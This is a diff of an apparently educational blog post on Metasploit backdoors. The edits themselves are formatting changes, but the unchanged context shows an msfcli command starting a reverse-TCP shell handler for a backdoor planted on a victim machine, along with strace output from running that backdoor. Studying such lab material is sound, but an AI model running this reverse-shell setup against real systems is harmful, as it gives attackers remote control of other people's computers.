@@ -41,6 +41,7 @@ Options: {"LHOST"=>"192.168.56.102"}
 
 At this point, assuming the backdoor has been copied to the victim's system. The attacking computer can initiate the payload.  
 
+<!-- markdownlint-disable -->
 ```bash
 root@kali01:~# msfcli multi/handler payload=linux/x86/shell/reverse_tcp LHOST=192.168.56.102 E
 [*] Initializing modules...
@@ -56,6 +57,7 @@ LHOST => 192.168.56.102
 [*] Started reverse handler on 192.168.56.102:4444
 [*] Starting the payload handler...
 ```
+<!-- markdownlint-enable -->
 
 From here the attacker waits, until the backdoor is run on the victims computer.
 
@@ -69,6 +71,7 @@ Segmentation fault (core dumped)
 ```
 
 (Detailed strace output)
+
 ```bash
 xecve("./cool_shit", ["./cool_shit"], [/* 20 vars */]) = 0
 [ Process PID=4859 runs in 32 bit mode. ]
@@ -101,4 +104,4 @@ Obviously, malicious backdoors are a lot more sophisticated than this, however t
 
 Reference:
 
-* <a href="http://www.offensive-security.com/metasploit-unleashed/Msfpayload" target="_blank">http://www.offensive-security.com/metasploit-unleashed/Msfpayload</a>
+* <a href="http://www.offensive-security.com/metasploit-unleashed/Msfpayload" target="_blank">www.offensive-security.com/metasploit-unleashed/Msfpayload</a>
